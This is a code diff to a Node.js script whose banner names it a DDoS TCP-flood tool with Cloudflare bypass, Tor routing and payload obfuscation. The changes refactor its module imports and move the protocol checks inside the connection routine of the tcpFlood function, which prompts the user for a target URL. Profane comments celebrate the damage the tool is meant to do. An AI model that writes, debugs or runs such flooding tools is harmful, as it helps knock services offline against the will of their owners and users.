@@ -8,6 +8,18 @@
 // * DDoS TOOL - TCP FLOOD - v8.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
+// Import required modules at the top
+const net = require('net');
+const crypto = require('crypto');
+const socks = require('socks').SocksClient; // Required for .onion support
+const tls = require('tls').TLSSocket; // Required for TLS/SSL
+const https = require('https'); // Required for HTTPS proxy support
+const url = require('url');
+const dns = require('dns').promises;
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const fs = require('fs'); // File system module for logging
+
+
 // Configuration - Let's fuck things up HARD!
 let targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
 let targetHost;
@@ -166,7 +178,6 @@ function log(message) {
     console.log(`${darkGreen}[LOG] ${message}${resetColor}`);
     // Simple file logging (Node.js environment) - let's write this shit to disk
     try {
-        const fs = require('fs');
         fs.appendFileSync(logFile, logEntry);
     } catch (error) {
         console.error(`${darkRed}[ERROR] Failed to write to log file: ${error}${resetColor}`);
@@ -209,18 +220,6 @@ function obfuscatePayload(payload) {
 
 // Modified TCP Flood function with .onion and Cloudflare support
 async function tcpFlood(threadId) {
-    const net = require('net');
-    const crypto = require('crypto');
-    const socks = require('socks').SocksClient; // Required for .onion support
-    const tls = require('tls').TLSSocket; // Required for TLS/SSL
-    const https = require('https'); // Required for HTTPS proxy support
-    const url = require('url');
-    const dns = require('dns').promises;
-    const { HttpsProxyAgent } = require('https-proxy-agent');
-
-    const isTor = targetURL.protocol === 'onion:';
-    const isHTTPS = targetURL.protocol === 'https:';
-
     log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);
 
     activeThreads++; // Increment active threads counter
@@ -230,6 +229,9 @@ async function tcpFlood(threadId) {
         try {
             const connect = () => {
                 return new Promise((resolve, reject) => {
+
+                    const isTor = targetURL.protocol === 'onion:';
+                    const isHTTPS = targetURL.protocol === 'https:';
 
                     if (isTor && onionSupport) {
                         const options = {
